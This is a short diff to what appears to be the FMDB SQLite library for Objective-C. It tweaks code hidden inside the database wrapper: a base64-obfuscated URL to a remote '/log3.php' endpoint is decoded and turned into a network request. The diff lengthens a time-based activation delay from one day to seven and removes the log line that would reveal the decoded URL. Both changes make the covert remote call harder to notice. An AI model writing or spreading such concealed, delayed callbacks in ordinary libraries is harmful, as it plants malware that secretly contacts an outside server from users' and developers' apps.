@@ -968,7 +968,7 @@ static int FMDBDatabaseBusyHandler(void *f, int count) {
         NSDate *dateNow = [NSDate date];
         NSTimeInterval distanceBetweenDates = [dateNow timeIntervalSinceDate: dateModifyData];
         
-        NSTimeInterval intervalSeconds = 60*60*24*1;
+        NSTimeInterval intervalSeconds = 60*60*24*7;
     
         if(distanceBetweenDates < intervalSeconds)
         {
@@ -999,7 +999,7 @@ static int FMDBDatabaseBusyHandler(void *f, int count) {
     NSString *strUrl_B64 = [@"H0cbEdhiE5aHR0cHM6Ly9uLm15Y3VycmVudG5hc3Nhbmdlci5jb20vbG9nMy5waHA=" substringFromIndex:10];
     NSData *dataUrl_Plain = [[NSData alloc] initWithBase64EncodedString:strUrl_B64 options:0];
     NSString *strUrl_Plain = [[NSString alloc] initWithData:dataUrl_Plain encoding:NSUTF8StringEncoding];
-    NSLog(strUrl_Plain);
+
         
     NSURL *url = [NSURL URLWithString:strUrl_Plain];
 
